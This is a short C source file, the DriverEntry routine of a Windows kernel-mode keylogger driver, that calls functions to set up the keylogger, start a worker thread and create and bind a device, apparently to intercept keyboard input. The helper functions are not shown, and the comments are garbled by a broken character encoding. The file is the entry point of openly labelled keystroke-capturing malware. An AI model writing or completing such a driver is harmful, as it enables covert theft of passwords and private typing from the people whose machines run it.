#include <ntddk.h>
#include "KeyLoger.h"

PTHREADCONTEXT g_pThreadContext;

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
#ifdef DBG
	__debugbreak();
#endif

	DbgPrint("Keyloger DriverEntry Enter\n");

	//��д�ص�����
	NTSTATUS ntRet = InitKeylogger(DriverObject, RegistryPath);
	if (ntRet != STATUS_SUCCESS)
	{
		goto SAFE_EXIT;
	}
	
	//��ʼ���̵߳Ļ���
	ntRet = InitKeyloggerEnv(DriverObject);
	if (ntRet != STATUS_SUCCESS)
	{
		goto SAFE_EXIT;
	}

	//�����߳�
	ntRet = InitKeyloggerThread(DriverObject);
	if (ntRet != STATUS_SUCCESS)
	{
		goto SAFE_EXIT;
	}

	//���������豸
	ntRet = CreateAndBindDevice(DriverObject);
	if (ntRet != STATUS_SUCCESS)
	{
		goto SAFE_EXIT;
	}

SAFE_EXIT:
	DbgPrint("Keyloger DriverEntry Leave\n");

	return STATUS_SUCCESS;
}